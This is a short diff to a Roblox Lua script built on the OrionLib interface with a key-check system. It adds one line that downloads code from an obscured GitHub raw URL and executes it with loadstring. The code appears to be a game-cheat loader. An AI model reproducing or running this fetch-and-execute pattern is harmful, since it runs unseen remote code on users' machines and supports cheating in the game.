@@ -14,6 +14,7 @@ local KeyInput = "String"
 
 function loadscript()
     OrionLib:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Fr0go1/akdhfdsiujhkjbsda/main/fdssdfadsafdsffdsahgfgsdasfdzvabfdhgfnddhfsgdaasfsdafbfsdhdfgdfgsdadsafdsgagdfsdfsdgsfbsxfvfxssd"))()
 end
 
 function correctkey()
@@ -79,3 +80,4 @@ Tab:AddButton({
         end 
   	end    
 })
+
